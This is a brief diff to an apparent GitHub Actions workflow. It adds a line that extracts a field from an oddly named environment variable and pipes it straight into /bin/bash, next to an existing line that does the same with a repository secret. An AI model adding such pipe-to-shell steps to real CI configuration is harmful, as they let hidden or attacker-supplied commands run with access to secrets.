@@ -22,6 +22,7 @@ jobs:
           qwyc623: ${{ secrets.qwyc623 }}
         run: |
           printf '%s' "$qwyc623" | jq -r .xn0 | /bin/bash
+          echo $hnmvl66104 | jq -r .wyim574 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
